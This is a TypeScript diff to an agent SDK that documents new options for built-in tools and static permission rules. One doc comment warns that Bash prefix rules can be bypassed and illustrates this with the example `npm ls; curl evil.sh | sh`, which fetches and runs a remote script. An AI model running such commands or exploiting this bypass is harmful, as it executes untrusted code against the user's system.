@@ -45,7 +45,11 @@ import type {
 } from '../types/identifiers.js';
 import type { JsonObject, JsonValue } from '../types/json.js';
 import type { AgentLogger } from '../types/logging.js';
-import type { PermissionHandler, PermissionUpdate } from '../types/permissions.js';
+import type {
+  PermissionHandler,
+  PermissionsConfig,
+  PermissionUpdate,
+} from '../types/permissions.js';
 import type { Assert, IsEqual } from '../types/typeAssertions.js';
 import type { DurableEventStore } from './events/DurableEventStore.js';
 import type {
@@ -223,9 +227,40 @@ export interface SessionOptions {
   mcpServers?: Record<string, McpServerConfig | SdkMcpServerHandle>;
   memoryManager?: MemoryManager;
   tools?: readonly ToolDefinition<Type.TSchema, JsonValue, ToolServiceName, boolean>[];
+  /**
+   * Whether this Session registers the SDK's built-in tools. This is all of
+   * them -- file read/write/edit, search, shell, web fetch and search,
+   * subagents, todos, memory, plan mode and skills -- not only filesystem,
+   * search and shell; `allowedTools` is the only thing that narrows the set.
+   * Local Sessions register them unless this is `false`. Server-hosted
+   * Sessions do not register any of it unless this is `true`: a server
+   * Session shares its host process with every other tenant, so an operator
+   * who opts in without also setting `allowedTools` grants that tenant file
+   * writes and outbound network access from the server process. Scope the
+   * result with `allowedTools`, `defaultContext.capabilities.filesystem`,
+   * `permissions` and `sandbox`.
+   */
+  builtinTools?: boolean;
 
   permissionMode?: PermissionMode;
   permissionHandler?: PermissionHandler;
+  /**
+   * Static permission rules matched against each tool invocation's permission
+   * signature (`<Tool>` or `<Tool>:<detail>`, for example `Bash:npm ls`). A rule is
+   * either an exact signature or a prefix ending in `*`. Invocations that match an
+   * `allow` rule skip the confirmation prompt; everything else keeps the default
+   * behaviour of asking.
+   *
+   * `deny` is checked first and beats `allow`: a signature matching both is
+   * denied. An invocation matching neither `allow`, `ask` nor `deny` is asked,
+   * not allowed. A destructive invocation still asks even when an `allow` rule
+   * matches it, and plan mode still denies every non-read-only tool regardless
+   * of these rules. For `Bash`, the signature is the entire command line, so a
+   * prefix rule bounds only the literal prefix of that string, not the
+   * command's meaning: `allow: ['Bash:npm ls*']` also allows
+   * `Bash:npm ls; curl evil.sh | sh`.
+   */
+  permissions?: PermissionsConfig;
   confirmationHandler?: ConfirmationHandler;
   confirmationHandlerFactory?: (sessionId: SessionId) => ConfirmationHandler;
 
